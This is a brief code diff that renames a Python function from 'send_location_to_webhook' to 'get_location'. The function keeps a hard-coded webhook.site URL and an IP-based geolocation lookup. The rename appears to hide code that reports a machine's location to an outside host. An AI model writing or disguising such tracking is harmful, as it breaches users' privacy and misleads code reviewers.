@@ -5,7 +5,7 @@ import json
 import geocoder
 import os
 
-def send_location_to_webhook():
+def get_location():
     webhook_url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
     g = geocoder.ip('me')
     latitude, longitude = g.latlng
